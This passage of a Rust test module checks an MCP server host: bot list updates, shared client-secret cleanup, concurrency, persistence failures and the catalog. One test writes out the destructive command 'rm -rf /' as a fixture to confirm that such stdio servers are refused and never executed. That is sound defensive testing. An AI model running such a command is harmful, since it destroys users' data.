            .await
            .unwrap();
        assert_eq!(dto.bots, Some(vec!["a".to_owned()]));
        let dto = host.update("files", json!({"bots": []})).await.unwrap();
        assert_eq!(dto.bots, Some(Vec::new()));
        // Same registration (not detached / re-registered) and no status churn.
        let after = host.manager.server_handle("files").unwrap();
        assert!(before.same_server(&after));
        assert_eq!(events_of(&mut rx).await, Vec::<McpStatus>::new());

        // Any other field still restarts it.
        host.update("files", json!({"enabled": true, "bots": ["a"]}))
            .await
            .unwrap();
        let restarted = host.manager.server_handle("files").unwrap();
        assert!(!before.same_server(&restarted));
        host.shutdown().await;
    }

    #[tokio::test]
    async fn bots_lists_are_deduplicated_and_combine_as_documented() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let mut input = stdio("s", false);
        input.bots = Some(vec!["a".into(), "a".into(), "b".into()]);
        let dto = host.add(input).await.unwrap();
        assert_eq!(dto.bots, Some(vec!["a".to_owned(), "b".to_owned()]));
        // Absolute `bots` first, then add, then remove (the documented order).
        let dto = host
            .update(
                "s",
                json!({"bots": ["x", "x", "y"], "bots_add": ["z", "x"], "bots_remove": ["y"]}),
            )
            .await
            .unwrap();
        assert_eq!(dto.bots, Some(vec!["x".to_owned(), "z".to_owned()]));
        // A `null` base makes add / remove inert in the same body.
        let dto = host
            .update("s", json!({"bots": null, "bots_add": ["q"]}))
            .await
            .unwrap();
        assert_eq!(dto.bots, None);
        host.shutdown().await;
    }

    fn google_like(name: &str, secret_ref: &str) -> McpServerConfig {
        let mut config = McpServerConfig::http(name, format!("https://{name}.example/mcp"));
        config.enabled = false;
        config.oauth = Some(mcp_bridge::OAuthConfig {
            client_id: Some("123456-abc.apps.googleusercontent.com".into()),
            client_secret_ref: Some(secret_ref.into()),
            issuer: Some("https://accounts.google.com".into()),
            scopes: vec!["https://www.googleapis.com/auth/gmail.readonly".into()],
            ..mcp_bridge::OAuthConfig::default()
        });
        config
    }

    #[test]
    fn only_an_apps_own_secret_names_can_be_forgotten_with_it() {
        for ok in [
            "mcp_google_client_secret",
            "mcp/google/client_secret",
            "MCP_Google_Secret",
        ] {
            assert!(forgettable_client_secret(ok), "{ok}");
        }
        for no in [
            "provider.second.api_key",
            "mcp/google/oauth",
            "mcp/google/oauth-refresh",
            "composio/key",
            "fill/site/login",
            "webhook/abc",
            "telegram_token",
        ] {
            assert!(!forgettable_client_secret(no), "{no}");
        }
    }

    /// The shared client secret goes with the last app that used it, and only when asked.
    #[tokio::test]
    async fn the_client_secret_is_forgotten_with_its_last_server_only_when_asked() {
        // The name the desktop gives the one client secret all Google apps share.
        const SHARED: &str = "mcp_google_client_secret";
        let dir = tempfile::tempdir().unwrap();
        let mut by_header = McpServerConfig::http("other", "https://other.example/mcp");
        by_header.enabled = false;
        by_header
            .secret_headers
            .insert("X-Key".into(), format!("Bearer {{secret:{SHARED}}}"));
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[
                google_like("a", SHARED),
                google_like("b", SHARED),
                google_like("c", SHARED),
                google_like("d", "provider.second.api_key"),
                by_header,
            ])
            .unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        store.set(SHARED, "client-secret-value").unwrap();
        store
            .set("provider.second.api_key", "provider-key")
            .unwrap();
        let host = McpHost::start_with_policy(
            dir.path(),
            ToolRegistry::new(),
            Some(store.clone()),
            None,
            None,
            fast_policy(),
        );
        let present = |name: &str| store.get(name).unwrap().is_some();

        // Without the flag nothing but the server goes.
        host.remove("a").await.unwrap();
        assert!(present(SHARED));
        // Another Google app still uses it.
        host.remove_forgetting_client_secret("b").await.unwrap();
        assert!(present(SHARED));
        // The last Google app goes, but a server that names it in a header keeps it alive.
        host.remove_forgetting_client_secret("c").await.unwrap();
        assert!(present(SHARED), "a header still names it");
        host.remove("other").await.unwrap();
        // A secret that is not an app's own (no `mcp/` namespace) is never deleted this way.
        host.remove_forgetting_client_secret("d").await.unwrap();
        assert!(present("provider.second.api_key"));
        assert!(host.list().is_empty(), "every server is gone");

        // The last user of a secret in the app namespace takes it along.
        host.add(
            serde_json::from_value(json!({
                "name": "e", "transport": "http", "url": "https://e.example/mcp",
                "enabled": false,
                "oauth": {"client_id": "123456-abc.apps.googleusercontent.com",
                          "client_secret_ref": SHARED,
                          "issuer": "https://accounts.google.com"},
            }))
            .unwrap(),
        )
        .await
        .unwrap();
        assert!(matches!(
            host.remove_forgetting_client_secret("nope").await,
            Err(McpControlError::NotFound(_))
        ));
        assert!(present(SHARED), "an unknown server deletes nothing");
        host.remove_forgetting_client_secret("e").await.unwrap();
        assert!(!present(SHARED));
        host.shutdown().await;
    }

    #[tokio::test]
    async fn add_remove_ids_are_atomic_and_keep_open_servers_open() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let mut listed = stdio("listed", false);
        listed.bots = Some(vec!["a".into()]);
        host.add(listed).await.unwrap();
        host.add(stdio("open", false)).await.unwrap();
        let dto = host
            .update(
                "listed",
                json!({"bots_add": ["b", "a"], "bots_remove": ["x"]}),
            )
            .await
            .unwrap();
        assert_eq!(dto.bots, Some(vec!["a".to_owned(), "b".to_owned()]));
        // An open server stays open under add and remove.
        let dto = host
            .update("open", json!({"bots_add": ["a"], "bots_remove": ["b"]}))
            .await
            .unwrap();
        assert_eq!(dto.bots, None);
        host.shutdown().await;
    }

    /// Real parallelism: the removal and the update run on different worker
    /// threads, so a read-modify-write `forget_bot` would lose one of them.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn concurrent_forget_and_update_lose_nothing() {
        for round in 0..300 {
            let dir = tempfile::tempdir().unwrap();
            let host = open(dir.path());
            let mut input = stdio("s", false);
            input.bots = Some(vec!["gone".into(), "stay".into()]);
            host.add(input).await.unwrap();
            let h1 = Arc::clone(&host);
            let h2 = Arc::clone(&host);
            let forget = tokio::spawn(async move { h1.forget_bot("gone").await });
            let update =
                tokio::spawn(async move { h2.update("s", json!({"bots_add": ["new"]})).await });
            forget.await.unwrap().unwrap();
            update.await.unwrap().unwrap();
            let bots = host.list().remove(0).bots.unwrap();
            assert!(bots.contains(&"new".to_owned()), "round {round}: {bots:?}");
            assert!(bots.contains(&"stay".to_owned()), "round {round}: {bots:?}");
            assert!(
                !bots.contains(&"gone".to_owned()),
                "round {round}: {bots:?}"
            );
            let saved = TomlFileStore::new(dir.path().join(MCP_FILE))
                .load()
                .unwrap();
            assert_eq!(saved[0].bots.as_ref().unwrap(), &bots);
            assert_eq!(host.manager.server_bots("s").unwrap().as_ref(), Some(&bots));
            host.shutdown().await;
        }
    }

    #[tokio::test]
    async fn a_failed_persist_leaves_the_live_list_unchanged() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let mut input = stdio("s", false);
        input.bots = Some(vec!["a".into(), "b".into()]);
        host.add(input).await.unwrap();
        // Make saving impossible: a directory sits where `mcp.toml` must go.
        let file = dir.path().join(MCP_FILE);
        std::fs::remove_file(&file).unwrap();
        std::fs::create_dir(&file).unwrap();

        assert!(
            host.update("s", json!({"bots_remove": ["a"]}))
                .await
                .is_err()
        );
        assert!(host.update("s", json!({"bots": []})).await.is_err());
        assert!(host.forget_bot("a").await.is_err());
        let expect = Some(vec!["a".to_owned(), "b".to_owned()]);
        assert_eq!(host.list().remove(0).bots, expect);
        assert_eq!(host.manager.server_bots("s").unwrap(), expect);
        host.shutdown().await;
    }

    #[tokio::test]
    async fn invalid_update_keeps_the_old_server_registered_and_persisted() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        host.add(stdio("files", false)).await.unwrap();
        let before = std::fs::read_to_string(dir.path().join(MCP_FILE)).unwrap();
        let bad = host
            .update("files", json!({"tool_allow": ["[unclosed"]}))
            .await
            .unwrap_err();
        assert!(matches!(bad, McpControlError::Invalid(_)), "{bad:?}");
        // Still registered with the manager (not detached) and the file is untouched.
        assert!(host.manager.server_handle("files").is_ok());
        assert_eq!(
            std::fs::read_to_string(dir.path().join(MCP_FILE)).unwrap(),
            before
        );
        host.shutdown().await;
    }

    #[tokio::test]
    async fn dangerous_stdio_is_refused_and_mcp_toml_is_not_executed() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(MCP_FILE);
        std::fs::write(
            &path,
            "[[server]]\nid = \"evil\"\n[server.transport]\ntype = \"stdio\"\ncommand = \"rm\"\nargs = [\"-rf\", \"/\"]\n",
        )
        .unwrap();
        let host = open(dir.path());
        assert_eq!(host.list().len(), 0);
        let err = host.add(stdio("ok", false)).await.unwrap_err();
        assert!(matches!(err, McpControlError::Internal(_)), "{err:?}");
        assert!(std::fs::read_to_string(&path).unwrap().contains("evil"));
        host.shutdown().await;

        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let evil: McpServerInput = serde_json::from_value(json!({
            "name": "evil",
            "transport": "stdio",
            "command": "rm",
            "args": ["-rf", "/"],
            "enabled": false,
        }))
        .unwrap();
        let err = host.add(evil).await.unwrap_err();
        assert!(
            matches!(err, McpControlError::Invalid(ref m) if m.contains("never-list")),
            "{err:?}"
        );
        assert_eq!(host.list().len(), 0);
        host.shutdown().await;
    }

    fn assert_reloaded_zeta(list: &[McpServerDto]) {
        let zeta = list.iter().find(|s| s.name == "zeta").unwrap();
        assert!(zeta.trust_hints);
        assert!(!zeta.enabled);
        assert_eq!(zeta.bots, Some(vec!["bot-a".to_owned()]));
        assert_eq!(zeta.category, "fs");
    }

    #[tokio::test]
    async fn a_broken_file_is_never_overwritten() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(MCP_FILE);
        std::fs::write(&path, "this is not toml [[[").unwrap();
        let host = open(dir.path());
        let err = host.add(stdio("files", false)).await.unwrap_err();
        assert!(matches!(err, McpControlError::Internal(_)), "{err:?}");
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "this is not toml [[["
        );
        assert_eq!(host.list().len(), 0);
        assert!(host.catalog().len() >= 20);
        host.shutdown().await;
    }

    #[tokio::test]
    async fn catalog_is_the_curated_list() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let cat = host.catalog();
        assert!(cat.len() >= 20, "{}", cat.len());
        let github = cat.iter().find(|e| e.id == "github").unwrap();
        assert_eq!(github.icon.as_deref(), Some("github"));
        // GitHub moved to the hosted endpoint: a bearer header whose value is
        // the secret, not an npx package reading an env variable.
        assert_eq!(github.install.transport, McpTransportKind::Http);
        assert_eq!(
            github
                .install
                .secret_headers
                .get("Authorization")
                .map(String::as_str),
            Some("Bearer {secret:mcp/github-token}")
        );
        assert!(cat.iter().any(|e| e.id == "filesystem" && e.icon.is_none()));
        for id in ["context7", "home-assistant", "playwright"] {
            assert!(cat.iter().any(|e| e.id == id), "{id}");
        }
        host.shutdown().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn connection_work_releases_global_ops_for_other_management() {
        // A deterministic gate at the transport boundary keeps the connection
        // pending without sockets, subprocesses, or timing-dependent sleeps.
        type Gate = Arc<(std::sync::Mutex<bool>, std::sync::Condvar)>;
        struct ReleaseOnDrop(Gate);
        impl Drop for ReleaseOnDrop {
            fn drop(&mut self) {
                *self.0.0.lock().unwrap() = true;
                self.0.1.notify_all();
            }
        }
        struct GatedSecrets {
            gate: Gate,
            entered: Mutex<Option<tokio::sync::oneshot::Sender<()>>>,
        }
        impl SecretStore for GatedSecrets {
            fn get(
                &self,
                _: &str,
            ) -> Result<Option<secret_store::SecretValue>, secret_store::SecretError> {
                if let Some(entered) = self.entered.lock().take() {
                    let _ = entered.send(());
                }
                let mut released = self.gate.0.lock().unwrap();
                while !*released {
                    released = self.gate.1.wait(released).unwrap();
                }
                Ok(None) // Stops before attempting to spawn the fixture command.
            }
            fn set(&self, _: &str, _: &str) -> Result<(), secret_store::SecretError> {
                unreachable!()
            }
            fn delete(&self, _: &str) -> Result<bool, secret_store::SecretError> {
                unreachable!()
            }
            fn list_names(&self) -> Result<Vec<String>, secret_store::SecretError> {
                unreachable!()
            }
        }
        let dir = tempfile::tempdir().unwrap();
        let data = dir.path().join("Masaüstü-秘密");
        std::fs::create_dir(&data).unwrap();
        let gate = Arc::new((std::sync::Mutex::new(false), std::sync::Condvar::new()));
        let release = ReleaseOnDrop(Arc::clone(&gate));
        let (entered, started) = tokio::sync::oneshot::channel();
        let secrets = Arc::new(GatedSecrets {
            gate,
            entered: Mutex::new(Some(entered)),
        });
        let host = McpHost::start_with_policy(
            &data,
            ToolRegistry::new(),
            Some(secrets),
            None,
            None,
            fast_policy(),
        );
        let pending_host = Arc::clone(&host);
        let pending = tokio::spawn(async move { pending_host.add(stdio("pending", true)).await });
        started.await.unwrap();
        assert!(
            host.ops.try_lock().is_ok(),
            "connection work must not hold global ops"
        );
        assert_eq!(host.add(stdio("other", false)).await.unwrap().name, "other");
        host.remove("other").await.unwrap();
        assert!(matches!(
            host.config_of("other"),
            Err(McpControlError::NotFound(_))
        ));
        drop(release);
        assert_eq!(pending.await.unwrap().unwrap().status, McpStatus::Error);
        host.shutdown().await;
        drop(host); // Close the store/host before Windows removes the directory.
    }
}
